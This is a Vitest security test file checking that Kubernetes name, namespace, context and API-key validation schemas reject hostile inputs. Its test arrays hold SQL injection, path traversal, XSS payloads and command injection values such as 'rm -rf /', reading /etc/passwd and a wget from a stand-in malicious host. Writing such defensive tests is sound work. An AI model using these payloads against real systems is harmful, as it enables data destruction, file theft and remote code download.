/**
 * Security Tests: Input Validation
 *
 * Tests all input validation schemas for security vulnerabilities:
 * - SQL injection prevention
 * - Path traversal prevention
 * - Size limits enforcement
 * - Format validation
 * - XSS prevention
 */

import { describe, it, expect } from 'vitest'
import {
  k8sNameSchema,
  namespaceSchema,
  contextNameSchema,
  deploymentRestartSchema,
  podRestartSchema,
  aiQuerySchema,
  apiKeyManagementSchema,
} from '@/lib/validation/schemas'

describe('Security: Input Validation', () => {
  describe('K8s Name Validation', () => {
    it('should reject SQL injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE deployments; --",
        "1' OR '1'='1",
        "admin'--",
        "' OR 1=1--",
        "'; DELETE FROM pods WHERE '1'='1",
      ]

      for (const input of maliciousInputs) {
        const result = k8sNameSchema.safeParse(input)
        expect(result.success).toBe(false)
      }
    })

    it('should reject path traversal attempts', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        './../../secrets',
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ]

      for (const input of maliciousInputs) {
        const result = k8sNameSchema.safeParse(input)
        expect(result.success).toBe(false)
      }
    })

    it('should reject special characters', () => {
      const invalidInputs = [
        'name with spaces',
        'name@with#special$chars',
        'UPPERCASE_NAME',
        'name.with.dots',
        'name_with_underscores',
      ]

      for (const input of invalidInputs) {
        const result = k8sNameSchema.safeParse(input)
        expect(result.success).toBe(false)
      }
    })

    it('should enforce length limits', () => {
      const tooLong = 'a'.repeat(254)
      const result = k8sNameSchema.safeParse(tooLong)
      expect(result.success).toBe(false)
    })

    it('should accept valid K8s names', () => {
      const validInputs = [
        'my-deployment',
        'nginx-proxy',
        'app-v1',
        'service123',
        'a',
        'a'.repeat(253), // Max length
      ]

      for (const input of validInputs) {
        const result = k8sNameSchema.safeParse(input)
        expect(result.success).toBe(true)
      }
    })
  })

  describe('Namespace Validation', () => {
    it('should reject SQL injection', () => {
      const maliciousInputs = [
        "'; DROP TABLE namespaces; --",
        "default' OR '1'='1",
      ]

      for (const input of maliciousInputs) {
        const result = namespaceSchema.safeParse(input)
        expect(result.success).toBe(false)
      }
    })

    it('should enforce 63 character limit', () => {
      const tooLong = 'a'.repeat(64)
      const result = namespaceSchema.safeParse(tooLong)
      expect(result.success).toBe(false)

      const exactlyMax = 'a'.repeat(63)
      const validResult = namespaceSchema.safeParse(exactlyMax)
      expect(validResult.success).toBe(true)
    })

    it('should accept valid namespaces', () => {
      const validInputs = ['default', 'kube-system', 'my-app', 'ns-123']

      for (const input of validInputs) {
        const result = namespaceSchema.safeParse(input)
        expect(result.success).toBe(true)
      }
    })
  })

  describe('Context Name Validation', () => {
    it('should reject path traversal', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\config',
        './../../secrets',
      ]

      for (const input of maliciousInputs) {
        const result = contextNameSchema.safeParse(input)
        expect(result.success).toBe(false)
      }
    })

    it('should enforce length limit', () => {
      const tooLong = 'a'.repeat(256)
      const result = contextNameSchema.safeParse(tooLong)
      expect(result.success).toBe(false)
    })

    it('should accept valid context names', () => {
      const validInputs = [
        'minikube',
        'aws-eks-cluster',
        'gke_project_region_cluster',
        'docker-desktop',
      ]

      for (const input of validInputs) {
        const result = contextNameSchema.safeParse(input)
        expect(result.success).toBe(true)
      }
    })
  })

  describe('Deployment Restart Schema', () => {
    it('should validate both name and namespace', () => {
      const result = deploymentRestartSchema.safeParse({
        name: 'my-deployment',
        namespace: 'default',
      })
      expect(result.success).toBe(true)
    })

    it('should reject when namespace is missing', () => {
      const result = deploymentRestartSchema.safeParse({
        name: 'my-deployment',
      })
      expect(result.success).toBe(false)
    })

    it('should reject SQL injection in both fields', () => {
      const result = deploymentRestartSchema.safeParse({
        name: "'; DROP TABLE deployments; --",
        namespace: "'; DROP TABLE namespaces; --",
      })
      expect(result.success).toBe(false)
    })
  })

  describe('Pod Restart Schema', () => {
    it('should validate pod name and namespace', () => {
      const result = podRestartSchema.safeParse({
        name: 'my-pod-abc123',
        namespace: 'default',
      })
      expect(result.success).toBe(true)
    })

    it('should reject invalid pod names', () => {
      const result = podRestartSchema.safeParse({
        name: 'INVALID_POD',
        namespace: 'default',
      })
      expect(result.success).toBe(false)
    })
  })

  describe('AI Query Schema', () => {
    it('should require all required fields (context is optional)', () => {
      const result = aiQuerySchema.safeParse({
        query: 'Why is my pod failing?',
        apiKey: 'sk-test1234567890abcdef',
      })
      expect(result.success).toBe(true)
    })

    it('should reject missing query', () => {
      const result = aiQuerySchema.safeParse({
        apiKey: 'sk-test1234567890abcdef',
        context: {},
      })
      expect(result.success).toBe(false)
    })

    it('should reject missing apiKey', () => {
      const result = aiQuerySchema.safeParse({
        query: 'Why is my pod failing?',
        context: {},
      })
      expect(result.success).toBe(false)
    })

    it('should enforce query length limits', () => {
      const tooLong = 'a'.repeat(10001)
      const result = aiQuerySchema.safeParse({
        query: tooLong,
        apiKey: 'sk-test1234567890abcdef',
      })
      expect(result.success).toBe(false)
    })

    it('should accept valid context object', () => {
      const result = aiQuerySchema.safeParse({
        query: 'Why is my pod failing?',
        apiKey: 'sk-test1234567890abcdef',
        context: {
          resource: {
            type: 'Pod',
            name: 'my-pod',
            namespace: 'default',
            status: 'CrashLoopBackOff',
          },
          events: [],
          logs: [],
        },
      })
      expect(result.success).toBe(true)
    })
  })

  describe('API Key Management Schema', () => {
    it('should validate keyName and value', () => {
      const result = apiKeyManagementSchema.safeParse({
        keyName: 'openai',
        value: 'sk-test-key-12345',
      })
      expect(result.success).toBe(true)
    })

    it('should reject SQL injection in keyName', () => {
      const result = apiKeyManagementSchema.safeParse({
        keyName: "'; DROP TABLE api_keys; --",
        value: 'sk-test-key',
      })
      expect(result.success).toBe(false)
    })

    it('should enforce keyName format', () => {
      const invalidNames = [
        'key with spaces',
        'key@special#chars',
        '../../../etc/passwd',
      ]

      for (const keyName of invalidNames) {
        const result = apiKeyManagementSchema.safeParse({
          keyName,
          value: 'sk-test-key',
        })
        expect(result.success).toBe(false)
      }
    })

    it('should enforce value length limits', () => {
      const tooLong = 'sk-' + 'a'.repeat(1000)
      const result = apiKeyManagementSchema.safeParse({
        keyName: 'openai',
        value: tooLong,
      })
      expect(result.success).toBe(false)
    })
  })

  describe('XSS Prevention', () => {
    it('should reject HTML/script tags in names', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
      ]

      for (const payload of xssPayloads) {
        const result = k8sNameSchema.safeParse(payload)
        expect(result.success).toBe(false)
      }
    })
  })

  describe('Command Injection Prevention', () => {
    it('should reject shell commands', () => {
      const commandInjections = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/script.sh',
        '`whoami`',
        '$(whoami)',
      ]

      for (const payload of commandInjections) {
        const result = k8sNameSchema.safeParse(payload)
        expect(result.success).toBe(false)
      }
    })
  })
})
